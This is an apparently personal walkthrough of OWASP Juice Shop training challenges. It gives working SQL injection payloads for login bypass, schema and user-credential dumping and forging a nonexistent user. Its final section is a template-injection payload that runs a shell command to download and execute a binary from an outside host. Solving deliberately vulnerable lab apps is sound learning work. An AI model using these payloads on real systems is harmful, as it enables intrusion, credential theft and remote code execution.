## Table of contents

- [1. SQL Injection in Login Panel](#1-sql-injection-in-login-panel)
- [2. Login as Bender](#2-login-as-bender)
- [3. Login as Jim](#3-login-as-jim)
- [4. Database Schema](#4-database-schema)
- [5. User Credentials](#5-user-credentials)
- [6. Christmas Special](#6-christmas-special)
- [7. Ephemeral Accountant](#7-ephemeral-accountant)
- [8. SSTi](#8-ssti)

## 1. SQL Injection in Login Panel

> Vulnerable endpoint `/#/login`.

> Vulnerable parameter `email`.

> Vulnerable source code file `routes/login.ts`.

1. Inject a **`'`** to the email input field and observe the response. It will give a very useful error.
2. Inject **`' OR 1=1;`** with anything for password, you will get logged in as admin's account.

## 2. Login as Bender

> Bender's email id can be found on the `/#/about` endpoint. This is the only place this email is getting leaked there are other better solutions to find Bender's email. I chose this one cause this the solution Juiceshop's "Interactive hacking tutorial" is telling me to follow.

> This endpoint get is from `/api/Feedbacks/`.

1. Even though the email values are redacted we can still figure out which one is the email for bender.

## 3. Login as Jim

> His email can be found from one of the product reviews.

1. Login to the app with __`jim@juice-sh.op';`__ in the email field.

## 4. Database Schema

> The vulnerable endpoint is `/#/search?q=`.

1. Inject a **`'`** character to the parameter and send the request. You'll see the SQL statement used in the error. This error gives you the SQL statement being used.
2. Paste this into the parameter `)) UNION SELECT 1, 2, 3, 4, 5, 6, 7, 8, 9, group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%';`.

## 5. User Credentials

1. Send a request with `')) UNION SELECT 1, 2, 3, 4, 5, 6, 7, 8, 9,  GROUP_CONCAT(id || '|' || email || '|' || password || '|' || role || '|' || deluxeToken || '|' || lastLoginIp || '|' || profileImage) FROM Users;` as the value to enumerate the user credential.

## 6. Christmas Special

> The thought process behind this challenge's logic is that the X'MAS offer is deleted after it got expired.

1. Use `test')) UNION SELECT * FROM PRODUCTS WHERE deletedAt IS NOT NULL--` for the parameter's value and look a the response to figure out which product-id ( 10 ) belongs for the X'MAS offer.
2. A `POST` request is sent to `/api/BasketItems/` while adding a product to the cart.
3. That request's body parameter has a product-id parameter, change its value to 10 and look at the cart to see the X'MAS offer product.
4. Complete the checkout and the challenge is finished.

## 7. Ephemeral Accountant

> We have to login as a user that doesn't even exist .

1. The `POST` request to `/rest/user/login` this path, we know is vulnerable to SQLi.
2. Change the body to what's shown below and we will complete this challenge as well.
```json
{
  "email": "' UNION SELECT * FROM (SELECT 20 AS `id`, 'acc0unt4nt@juice-sh.op' AS `username`, 'acc0unt4nt@juice-sh.op' AS `email`, 'test1234' AS `password`, 'accounting' AS `role`, '123' AS `deluxeToken`, '1.2.3.4' AS `lastLoginIp`, '/assets/public/images/uploads/default.svg' AS `profileImage`, '' AS `totpSecret`, 1 AS `isActive`, 12983283 AS `createdAt`, 133424 AS `updatedAt`, NULL AS `deletedAt`) AS tmp WHERE '1'='1';--",
  "password": "verysecurejuiceshop"
}
```

## 8. SSTi

> The functionality to change the username of the user is vulnerable to SSTi.

1. Try to change the username and give `#{1+1}` as value an observe that it changes to `2`. That means its vulnerable to SSTi.
2. The malware required can be found in this `/ftp/quarantine` endpoint.
3. Place `#{global.process.mainModule.require('child_process').exec('wget -O malware https://github.com/J12934/juicy-malware/blob/master/juicy_malware_linux_64?raw=true && chmod +x malware && ./malware')}` as in the place of username and apply it.
4. This is supposed to work, Since I'm in a k8s pod this didn't work. Also there is a section saying that this challenge might be disabled in docker by default.